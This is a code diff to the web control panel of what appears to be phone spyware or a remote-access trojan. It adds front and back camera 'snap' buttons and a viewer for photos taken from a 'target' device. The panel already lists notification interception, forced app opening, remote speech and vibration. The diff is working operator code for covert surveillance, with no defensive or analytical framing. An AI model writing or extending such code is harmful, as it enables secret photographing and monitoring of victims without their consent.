@@ -140,6 +140,8 @@
         <button onclick="toggleInput('speak')">VOICE OF GOD</button>
         <button onclick="toggleInput('open')">FORCE OPEN</button>
         <button onclick="cmd('VIBRATE')">VIBRATE TARGET</button>
+        <button onclick="snap('front')">SNAP FRONT</button>
+        <button onclick="snap('back')">SNAP BACK</button>
     </div>
 
     <input type="text" id="speak_input" placeholder="Enter text to speak..." onchange="sendInput('SPEAK', this.value)">
@@ -153,6 +155,11 @@
         style="border: 1px solid #333; padding: 10px; height: 150px; overflow-y: scroll; text-align: left; margin-bottom: 20px;">
         <div style="border-bottom: 1px solid #333; color: #666; font-size: 0.8rem;">[NOTIFICATION INTERCEPT STREAM]
         </div>
+    </div>
+
+    <div id="camera-preview" style="margin-top: 20px; border: 2px solid var(--neon); padding: 5px; display: none;">
+        <div style="font-size: 0.7rem; margin-bottom: 5px;">[LAST CAMERA SHOT]</div>
+        <img id="shot-img" src="" style="width: 100%; max-width: 400px; border: 1px solid var(--neon);">
     </div>
 
     <div id="terminal"></div>
@@ -206,10 +213,23 @@
             container.scrollTop = container.scrollHeight;
         });
 
+        socket.on('camera_shot', (data) => {
+            const preview = document.getElementById('camera-preview');
+            const img = document.getElementById('shot-img');
+            img.src = `data:image/jpeg;base64,${data.image}`;
+            preview.style.display = 'block';
+            log(`CAMERA SHOT RECEIVED (${data.camera})`);
+        });
+
         function cmd(action) {
             if (navigator.vibrate) navigator.vibrate(50);
             socket.emit('command', { action });
             log(`Sent command: ${action}`);
+        }
+
+        function snap(camera) {
+            socket.emit('command', { action: 'TAKE_PHOTO', camera });
+            log(`Sent command: TAKE_PHOTO (${camera})`);
         }
 
         function sendInput(action, value) {
